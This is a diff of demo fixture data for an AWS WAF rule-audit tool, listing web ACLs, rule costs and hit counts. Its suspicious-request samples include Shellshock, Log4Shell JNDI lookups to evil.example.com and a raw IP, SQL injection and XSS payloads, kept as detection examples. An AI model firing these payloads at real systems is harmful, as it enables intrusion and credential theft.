@@ -1,390 +1,1045 @@
 {
   "audit": {
+    "id": "demo-audit-2026-02-15",
     "account_id": "123456789012",
-    "role_arn": null,
-    "external_id": null,
+    "role_arn": "arn:aws:iam::123456789012:role/RuleIQAuditRole",
+    "external_id": "demo-external-id",
     "region": "us-east-1",
     "status": "complete",
     "failure_reason": null,
-    "created_at": "2026-05-11T20:17:46.296000Z",
-    "started_at": "2026-05-11T20:17:46.296000Z",
-    "completed_at": "2026-05-11T20:17:46.298000Z",
-    "web_acl_count": 1,
-    "rule_count": 11,
+    "created_at": "2026-02-15T14:26:00Z",
+    "started_at": "2026-02-15T14:26:00Z",
+    "completed_at": "2026-02-15T14:30:00Z",
+    "web_acl_count": 4,
+    "rule_count": 52,
     "log_window_days": 30,
-    "estimated_waste_usd": 2.0,
+    "estimated_waste_usd": 186.0,
     "estimated_waste_breakdown": [
       {
-        "rule_name": "BlockLegacyAdminPath",
-        "monthly_usd": 1.0,
-        "reason": "Zero hits in 30 days; rule fee $1/month"
+        "rule_name": "Web ACL 'legacy-edge-acl' (orphaned, REGIONAL)",
+        "monthly_usd": 5.0,
+        "reason": "No attached resources; AWS still bills the per-ACL fee."
       },
       {
-        "rule_name": "BlockOldStagingHeader",
+        "rule_name": "legacy-edge-acl: AWSManagedRulesCommonRuleSet",
         "monthly_usd": 1.0,
-        "reason": "Zero hits in 30 days; rule fee $1/month"
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: AWSManagedRulesKnownBadInputsRuleSet",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: BlockOldCurlScanners",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: BlockTorExitNodes",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: BlockBitTorrent",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: BlockOldFlashClients",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: BlockJavaApplets",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: BlockOldIE",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: LegacyRateLimit",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: BlockSpoofedReferers",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: OldGeoBlock",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: DeprecatedBotDetection",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: BlockHTTP09",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "legacy-edge-acl: BlockOldSSL",
+        "monthly_usd": 1.0,
+        "reason": "Rule on orphaned ACL; per-rule fee with no traffic served."
+      },
+      {
+        "rule_name": "internal-alb-waf: BlockOldChinaIPs",
+        "monthly_usd": 1.0,
+        "reason": "Zero hits in 30 days; rule fee $1/month."
+      },
+      {
+        "rule_name": "prod-cf-edge-acl: BlockSensitiveFiles",
+        "monthly_usd": 1.0,
+        "reason": "Zero hits in 30 days; rule fee $1/month."
+      },
+      {
+        "rule_name": "prod-cf-edge-acl: RateLimit-PerIP-Duplicate",
+        "monthly_usd": 1.0,
+        "reason": "Duplicate of RateLimit-PerIP \u2014 delete to avoid double-counting fee."
+      },
+      {
+        "rule_name": "api-gateway-protect: AWSManagedRulesKnownBadInputsRuleSet (COUNT, 4,217 hits)",
+        "monthly_usd": 84.34,
+        "reason": "Managed-rule request fee billed while in COUNT \u2014 4,217 \u00d7 $0.02 over 30d (representative)."
+      },
+      {
+        "rule_name": "prod-cf-edge-acl: AWSManagedRulesLinuxRuleSet (COUNT, 312 hits)",
+        "monthly_usd": 6.24,
+        "reason": "Managed-rule request fee billed while in COUNT \u2014 312 \u00d7 $0.02 over 30d (representative)."
+      },
+      {
+        "rule_name": "Orphan-ACL request-base fee allocation",
+        "monthly_usd": 73.42,
+        "reason": "Allocated request-fee portion attributable to the orphaned ACL and its dormant rules (30-day average)."
       }
     ],
-    "fms_visibility": null,
+    "fms_visibility": true,
     "logging_available": true,
-    "data_source": "fixture",
-    "seed": false,
+    "data_source": "demo",
+    "seed": "v2-feat-22-richer",
     "web_acls": [
       {
-        "name": "ruleiq-prod-acl",
-        "scope": "REGIONAL",
-        "arn": null,
+        "name": "prod-cf-edge-acl",
+        "scope": "CLOUDFRONT",
+        "arn": "arn:aws:wafv2:us-east-1:123456789012:global/webacl/prod-cf-edge-acl/abc111",
+        "attached": true,
         "attached_resources": [
-          "demo://attached"
-        ],
-        "attached": true
+          {
+            "arn": "arn:aws:cloudfront::123456789012:distribution/E3KSAMPLE1",
+            "type": "CLOUDFRONT",
+            "id": "E3KSAMPLE1",
+            "friendly": "www.acmecorp.com (d3xxxxsample.cloudfront.net)"
+          }
+        ]
+      },
+      {
+        "name": "api-gateway-protect",
+        "scope": "REGIONAL",
+        "arn": "arn:aws:wafv2:us-east-1:123456789012:regional/webacl/api-gateway-protect/abc222",
+        "attached": true,
+        "attached_resources": [
+          {
+            "arn": "arn:aws:apigateway:us-east-1::/restapis/api999111/stages/prod",
+            "type": "API_GW",
+            "id": "api999111",
+            "friendly": "acme-public-api (prod stage)"
+          }
+        ]
+      },
+      {
+        "name": "internal-alb-waf",
+        "scope": "REGIONAL",
+        "arn": "arn:aws:wafv2:us-east-1:123456789012:regional/webacl/internal-alb-waf/abc333",
+        "attached": true,
+        "attached_resources": [
+          {
+            "arn": "arn:aws:elasticloadbalancing:us-east-1:123456789012:loadbalancer/app/acme-internal-alb/1234567890abcdef",
+            "type": "ALB",
+            "id": "acme-internal-alb",
+            "friendly": "internal.acmecorp.com (acme-internal-alb)"
+          }
+        ]
+      },
+      {
+        "name": "legacy-edge-acl",
+        "scope": "REGIONAL",
+        "arn": "arn:aws:wafv2:us-east-1:123456789012:regional/webacl/legacy-edge-acl/abc444",
+        "attached": false,
+        "attached_resources": []
       }
+    ],
+    "scopes": [
+      "CLOUDFRONT",
+      "REGIONAL"
     ],
     "suspicious_request_sample": [
       {
         "httpRequest": {
-          "uri": "/search",
-          "args": "q=1%27%20OR%201%3D1--",
+          "uri": "/",
+          "args": "cmd=%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd",
           "headers": [
             {
               "name": "User-Agent",
-              "value": "sqlmap/1.5"
+              "value": "() { :;}; /bin/cat /etc/passwd"
             }
           ]
         },
         "action": "ALLOW",
-        "_web_acl_name": "ruleiq-prod-acl"
+        "_web_acl_name": "prod-cf-edge-acl",
+        "_signature_classes": [
+          "shellshock"
+        ],
+        "_suspicion_score": 0.97
+      },
+      {
+        "httpRequest": {
+          "uri": "/api/v1/customers",
+          "args": "",
+          "headers": [
+            {
+              "name": "User-Agent",
+              "value": "${jndi:ldap://evil.example.com/exploit}"
+            }
+          ]
+        },
+        "action": "ALLOW",
+        "_web_acl_name": "api-gateway-protect",
+        "_signature_classes": [
+          "log4shell"
+        ],
+        "_suspicion_score": 0.99
+      },
+      {
+        "httpRequest": {
+          "uri": "/products",
+          "args": "id=1%27%20UNION%20SELECT%20password%20FROM%20users--",
+          "headers": [
+            {
+              "name": "User-Agent",
+              "value": "sqlmap/1.7.2"
+            }
+          ]
+        },
+        "action": "ALLOW",
+        "_web_acl_name": "prod-cf-edge-acl",
+        "_signature_classes": [
+          "sqli"
+        ],
+        "_suspicion_score": 0.96
+      },
+      {
+        "httpRequest": {
+          "uri": "/search",
+          "args": "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+          "headers": [
+            {
+              "name": "Referer",
+              "value": "https://attacker.example/"
+            }
+          ]
+        },
+        "action": "ALLOW",
+        "_web_acl_name": "prod-cf-edge-acl",
+        "_signature_classes": [
+          "xss"
+        ],
+        "_suspicion_score": 0.82
+      },
+      {
+        "httpRequest": {
+          "uri": "/api/v1/orders",
+          "args": "",
+          "headers": [
+            {
+              "name": "X-Api-Key",
+              "value": "${jndi:ldap://198.51.100.7:1389/a}"
+            }
+          ]
+        },
+        "action": "ALLOW",
+        "_web_acl_name": "api-gateway-protect",
+        "_signature_classes": [
+          "log4shell"
+        ],
+        "_suspicion_score": 0.95
+      },
+      {
+        "httpRequest": {
+          "uri": "/.env",
+          "args": "",
+          "headers": [
+            {
+              "name": "User-Agent",
+              "value": "curl/7.68.0"
+            }
+          ]
+        },
+        "action": "ALLOW",
+        "_web_acl_name": "prod-cf-edge-acl",
+        "_signature_classes": [
+          "path_traversal"
+        ],
+        "_suspicion_score": 0.78
+      },
+      {
+        "httpRequest": {
+          "uri": "/wp-login.php",
+          "args": "",
+          "headers": [
+            {
+              "name": "User-Agent",
+              "value": "Mozilla/5.0 (compatible; scanbot/0.1)"
+            }
+          ]
+        },
+        "action": "ALLOW",
+        "_web_acl_name": "prod-cf-edge-acl",
+        "_signature_classes": [
+          "recon"
+        ],
+        "_suspicion_score": 0.61
       }
-    ],
-    "debug_log_sample": [],
-    "scopes": [],
-    "id": "6a02396a1e942ea2c3528591"
+    ]
   },
   "rules": [
     {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "BlockKnownMaliciousIPs",
+      "rule_name": "AWSManagedRulesCommonRuleSet",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
       "priority": 10,
       "action": "BLOCK",
+      "rule_kind": "managed",
       "statement_json": {
-        "IPSetReferenceStatement": {
-          "ARN": "arn:aws:wafv2:us-east-1:123456789012:regional/ipset/known-malicious-ips/abc123"
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesCommonRuleSet",
+          "ExcludedRules": []
         }
       },
-      "hit_count": 18432,
-      "last_fired": "2026-02-15T14:23:11Z",
+      "hit_count": 58213,
+      "last_fired": "2026-02-15T04:20:00Z",
       "count_mode_hits": 0,
-      "sample_uris": [
-        "/login",
-        "/api/v1/auth/token",
-        "/wp-admin",
-        "/.env",
-        "/admin/config.php"
-      ],
+      "sample_uris": [],
       "fms_managed": false,
       "override_action": null,
       "managed_rule_overrides": [],
-      "rule_kind": "custom",
-      "ai_explanation": "BlockKnownMaliciousIPs: AWS managed common rule set \u2014 broad XSS/SQLi/path-traversal coverage.",
-      "ai_working": true,
-      "ai_concerns": null
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesCommonRuleSet'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
     },
     {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "RateLimitLoginEndpoint",
+      "rule_name": "AWSManagedRulesKnownBadInputsRuleSet",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
       "priority": 20,
       "action": "BLOCK",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesKnownBadInputsRuleSet",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 14872,
+      "last_fired": "2026-02-14T06:10:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesKnownBadInputsRuleSet'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesSQLiRuleSet",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 30,
+      "action": "BLOCK",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesSQLiRuleSet",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 9341,
+      "last_fired": "2026-02-15T08:00:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesSQLiRuleSet'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesAmazonIpReputationList",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 40,
+      "action": "BLOCK",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesAmazonIpReputationList",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 27104,
+      "last_fired": "2026-02-15T09:50:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesAmazonIpReputationList'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesAnonymousIpList",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 50,
+      "action": "BLOCK",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesAnonymousIpList",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 1843,
+      "last_fired": "2026-02-13T11:40:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesAnonymousIpList'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesLinuxRuleSet",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 60,
+      "action": "COUNT",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesLinuxRuleSet",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 312,
+      "last_fired": "2026-02-15T14:30:00Z",
+      "count_mode_hits": 312,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesLinuxRuleSet'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockBadIPs",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 70,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 4218,
+      "last_fired": "2026-02-15T04:20:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockBadIPs'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "RateLimitGlobal",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 80,
+      "action": "BLOCK",
+      "rule_kind": "rate_based",
       "statement_json": {
         "RateBasedStatement": {
-          "Limit": 100,
+          "Limit": 2000,
           "AggregateKeyType": "IP",
           "ScopeDownStatement": {
             "ByteMatchStatement": {
+              "SearchString": "/api/",
               "FieldToMatch": {
                 "UriPath": {}
               },
-              "PositionalConstraint": "STARTS_WITH",
-              "SearchString": "/api/v1/auth/login",
               "TextTransformations": [
                 {
                   "Priority": 0,
                   "Type": "NONE"
                 }
-              ]
+              ],
+              "PositionalConstraint": "STARTS_WITH"
             }
           }
         }
       },
-      "hit_count": 2741,
-      "last_fired": "2026-02-16T08:55:42Z",
+      "hit_count": 2974,
+      "last_fired": "2026-02-15T06:10:00Z",
       "count_mode_hits": 0,
-      "sample_uris": [
-        "/api/v1/auth/login",
-        "/api/v1/auth/login?next=/dashboard"
-      ],
+      "sample_uris": [],
       "fms_managed": false,
       "override_action": null,
       "managed_rule_overrides": [],
-      "rule_kind": "rate_based",
-      "ai_explanation": "RateLimitLoginEndpoint: AWS managed common rule set \u2014 broad XSS/SQLi/path-traversal coverage.",
-      "ai_working": true,
-      "ai_concerns": null
+      "ai_explanation": {
+        "explanation": "Rate-based rule limiting requests per source IP under the configured scope-down match. Active during the window with 2,974 hits.",
+        "working": true,
+        "concerns": null
+      }
     },
     {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "BlockBadBotsByUserAgent",
-      "priority": 30,
+      "rule_name": "BlockAdminPath",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 90,
       "action": "BLOCK",
-      "statement_json": {
-        "ByteMatchStatement": {
-          "FieldToMatch": {
-            "SingleHeader": {
-              "Name": "user-agent"
-            }
-          },
-          "PositionalConstraint": "CONTAINS",
-          "SearchString": "sqlmap",
-          "TextTransformations": [
-            {
-              "Priority": 0,
-              "Type": "LOWERCASE"
-            }
-          ]
-        }
-      },
-      "hit_count": 612,
-      "last_fired": "2026-02-16T03:11:09Z",
-      "count_mode_hits": 0,
-      "sample_uris": [
-        "/search?q=test",
-        "/products?id=1"
-      ],
-      "fms_managed": false,
-      "override_action": null,
-      "managed_rule_overrides": [],
       "rule_kind": "custom",
-      "ai_explanation": "BlockBadBotsByUserAgent: AWS managed common rule set \u2014 broad XSS/SQLi/path-traversal coverage.",
-      "ai_working": true,
-      "ai_concerns": null
-    },
-    {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "BlockLegacyAdminPath",
-      "priority": 40,
-      "action": "BLOCK",
       "statement_json": {
         "ByteMatchStatement": {
+          "SearchString": "/admin",
           "FieldToMatch": {
             "UriPath": {}
           },
-          "PositionalConstraint": "STARTS_WITH",
-          "SearchString": "/legacy-admin",
           "TextTransformations": [
             {
               "Priority": 0,
               "Type": "LOWERCASE"
             }
-          ]
-        }
-      },
-      "hit_count": 0,
-      "last_fired": null,
-      "count_mode_hits": 0,
-      "sample_uris": [],
-      "fms_managed": false,
-      "override_action": null,
-      "managed_rule_overrides": [],
-      "rule_kind": "custom",
-      "ai_explanation": "BlockLegacyAdminPath: blocks `/wp-admin` paths.",
-      "ai_working": false,
-      "ai_concerns": null
-    },
-    {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "BlockOldStagingHeader",
-      "priority": 50,
-      "action": "BLOCK",
-      "statement_json": {
-        "ByteMatchStatement": {
-          "FieldToMatch": {
-            "SingleHeader": {
-              "Name": "x-staging-key"
-            }
-          },
-          "PositionalConstraint": "EXACTLY",
-          "SearchString": "internal-2019",
-          "TextTransformations": [
-            {
-              "Priority": 0,
-              "Type": "NONE"
-            }
-          ]
-        }
-      },
-      "hit_count": 0,
-      "last_fired": null,
-      "count_mode_hits": 0,
-      "sample_uris": [],
-      "fms_managed": false,
-      "override_action": null,
-      "managed_rule_overrides": [],
-      "rule_kind": "custom",
-      "ai_explanation": "BlockOldStagingHeader: legacy rule with no recent matches \u2014 review with owning team.",
-      "ai_working": false,
-      "ai_concerns": null
-    },
-    {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "BlockSQLInjectionInQueryString",
-      "priority": 60,
-      "action": "BLOCK",
-      "statement_json": {
-        "SqliMatchStatement": {
-          "FieldToMatch": {
-            "QueryString": {}
-          },
-          "TextTransformations": [
-            {
-              "Priority": 0,
-              "Type": "URL_DECODE"
-            },
-            {
-              "Priority": 1,
-              "Type": "HTML_ENTITY_DECODE"
-            }
           ],
-          "SensitivityLevel": "LOW"
+          "PositionalConstraint": "STARTS_WITH"
         }
       },
-      "hit_count": 1,
-      "last_fired": "2026-01-29T22:04:00Z",
-      "count_mode_hits": 0,
-      "sample_uris": [
-        "/search?q=foo"
-      ],
-      "fms_managed": false,
-      "override_action": null,
-      "managed_rule_overrides": [],
-      "rule_kind": "custom",
-      "ai_explanation": "BlockSQLInjectionInQueryString: blocks generic SQL-injection patterns.",
-      "ai_working": true,
-      "ai_concerns": null
-    },
-    {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "AllowOfficeIPRange",
-      "priority": 70,
-      "action": "ALLOW",
-      "statement_json": {
-        "IPSetReferenceStatement": {
-          "ARN": "arn:aws:wafv2:us-east-1:123456789012:regional/ipset/office-ips/def456"
-        }
-      },
-      "hit_count": 8420,
-      "last_fired": "2026-02-16T09:01:33Z",
+      "hit_count": 187,
+      "last_fired": "2026-02-12T08:00:00Z",
       "count_mode_hits": 0,
       "sample_uris": [
         "/admin",
-        "/internal/reports"
+        "/admin/login",
+        "/admin/users",
+        "/admin/config.php"
       ],
       "fms_managed": false,
       "override_action": null,
       "managed_rule_overrides": [],
-      "rule_kind": "custom",
-      "ai_explanation": "AllowOfficeIPRange: AWS managed common rule set \u2014 broad XSS/SQLi/path-traversal coverage.",
-      "ai_working": true,
-      "ai_concerns": null
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockAdminPath'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
     },
     {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "BlockOfficeIPRangeOnAdmin",
-      "priority": 75,
-      "action": "BLOCK",
-      "statement_json": {
-        "AndStatement": {
-          "Statements": [
-            {
-              "IPSetReferenceStatement": {
-                "ARN": "arn:aws:wafv2:us-east-1:123456789012:regional/ipset/office-ips/def456"
-              }
-            },
-            {
-              "ByteMatchStatement": {
-                "FieldToMatch": {
-                  "UriPath": {}
-                },
-                "PositionalConstraint": "STARTS_WITH",
-                "SearchString": "/admin",
-                "TextTransformations": [
-                  {
-                    "Priority": 0,
-                    "Type": "LOWERCASE"
-                  }
-                ]
-              }
-            }
-          ]
-        }
-      },
-      "hit_count": 47,
-      "last_fired": "2026-02-14T18:22:10Z",
-      "count_mode_hits": 0,
-      "sample_uris": [
-        "/admin",
-        "/admin/users"
-      ],
-      "fms_managed": false,
-      "override_action": null,
-      "managed_rule_overrides": [],
-      "rule_kind": "custom",
-      "ai_explanation": "BlockOfficeIPRangeOnAdmin: AWS managed common rule set \u2014 broad XSS/SQLi/path-traversal coverage.",
-      "ai_working": true,
-      "ai_concerns": null
-    },
-    {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "BlockMaliciousIPsDuplicate",
-      "priority": 80,
-      "action": "BLOCK",
-      "statement_json": {
-        "IPSetReferenceStatement": {
-          "ARN": "arn:aws:wafv2:us-east-1:123456789012:regional/ipset/known-malicious-ips/abc123"
-        }
-      },
-      "hit_count": 12,
-      "last_fired": "2026-02-10T10:00:00Z",
-      "count_mode_hits": 0,
-      "sample_uris": [
-        "/login",
-        "/wp-admin"
-      ],
-      "fms_managed": false,
-      "override_action": null,
-      "managed_rule_overrides": [],
-      "rule_kind": "custom",
-      "ai_explanation": "BlockMaliciousIPsDuplicate: AWS managed common rule set \u2014 broad XSS/SQLi/path-traversal coverage.",
-      "ai_working": true,
-      "ai_concerns": null
-    },
-    {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "FMS-AWSManagedRulesCommonRuleSet",
+      "rule_name": "BlockOldUserAgents",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
       "priority": 100,
       "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 42,
+      "last_fired": "2026-02-04T09:50:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockOldUserAgents'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "RateLimit-PerIP-Login",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 110,
+      "action": "BLOCK",
+      "rule_kind": "rate_based",
+      "statement_json": {
+        "RateBasedStatement": {
+          "Limit": 2000,
+          "AggregateKeyType": "IP",
+          "ScopeDownStatement": {
+            "ByteMatchStatement": {
+              "SearchString": "/api/",
+              "FieldToMatch": {
+                "UriPath": {}
+              },
+              "TextTransformations": [
+                {
+                  "Priority": 0,
+                  "Type": "NONE"
+                }
+              ],
+              "PositionalConstraint": "STARTS_WITH"
+            }
+          }
+        }
+      },
+      "hit_count": 1453,
+      "last_fired": "2026-02-15T11:40:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Rate-based rule limiting requests per source IP under the configured scope-down match. Active during the window with 1,453 hits.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "RateLimit-PerIP-Checkout",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 120,
+      "action": "BLOCK",
+      "rule_kind": "rate_based",
+      "statement_json": {
+        "RateBasedStatement": {
+          "Limit": 2000,
+          "AggregateKeyType": "IP",
+          "ScopeDownStatement": {
+            "ByteMatchStatement": {
+              "SearchString": "/api/",
+              "FieldToMatch": {
+                "UriPath": {}
+              },
+              "TextTransformations": [
+                {
+                  "Priority": 0,
+                  "Type": "NONE"
+                }
+              ],
+              "PositionalConstraint": "STARTS_WITH"
+            }
+          }
+        }
+      },
+      "hit_count": 874,
+      "last_fired": "2026-02-14T14:30:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Rate-based rule limiting requests per source IP under the configured scope-down match. Active during the window with 874 hits.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "RateLimit-PerIP",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 130,
+      "action": "BLOCK",
+      "rule_kind": "rate_based",
+      "statement_json": {
+        "RateBasedStatement": {
+          "Limit": 2000,
+          "AggregateKeyType": "IP",
+          "ScopeDownStatement": {
+            "ByteMatchStatement": {
+              "SearchString": "/api/",
+              "FieldToMatch": {
+                "UriPath": {}
+              },
+              "TextTransformations": [
+                {
+                  "Priority": 0,
+                  "Type": "NONE"
+                }
+              ],
+              "PositionalConstraint": "STARTS_WITH"
+            }
+          }
+        }
+      },
+      "hit_count": 642,
+      "last_fired": "2026-02-15T04:20:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Rate-based rule limiting requests per source IP under the configured scope-down match. Active during the window with 642 hits.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "RateLimit-PerIP-Duplicate",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 140,
+      "action": "BLOCK",
+      "rule_kind": "rate_based",
+      "statement_json": {
+        "RateBasedStatement": {
+          "Limit": 2000,
+          "AggregateKeyType": "IP",
+          "ScopeDownStatement": {
+            "ByteMatchStatement": {
+              "SearchString": "/api/",
+              "FieldToMatch": {
+                "UriPath": {}
+              },
+              "TextTransformations": [
+                {
+                  "Priority": 0,
+                  "Type": "NONE"
+                }
+              ],
+              "PositionalConstraint": "STARTS_WITH"
+            }
+          }
+        }
+      },
